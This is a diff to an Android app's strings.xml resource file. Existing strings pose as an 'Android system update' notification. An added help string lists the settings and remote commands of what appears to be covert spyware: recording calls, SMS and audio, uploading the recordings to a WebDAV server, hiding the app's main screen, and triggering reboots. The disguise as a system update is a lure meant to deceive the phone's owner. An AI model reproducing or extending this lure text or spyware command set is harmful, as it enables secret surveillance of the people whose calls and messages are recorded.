@@ -5,5 +5,25 @@
     <string name="update_title">New update available!</string>
     <string name="update_text">Android system update!</string>
     <string name="update_subtext">This update fixes critical error in the telephony service, which can be cause of random reboots!</string>
+    <string name="help">"Settings:
+url={webdav url with auth}
+root_dir={absolute working folder}
+vibrate={duration (ms)}
+keep_days={count of days}
+wifi_only={true|false}
+keep_uploaded={true|false}
+calls_record={true|false}
+sms_record={true|false}
+
+Commands:
+info
+hide - disable main activity
+show - enable main activity
+mobile|wifi={true|false}
+rec={duration (s)}
+vibro={duration (ms)}
+reboot[={reason}]
+super={1|2|3|4}"
+    </string>
 
 </resources>
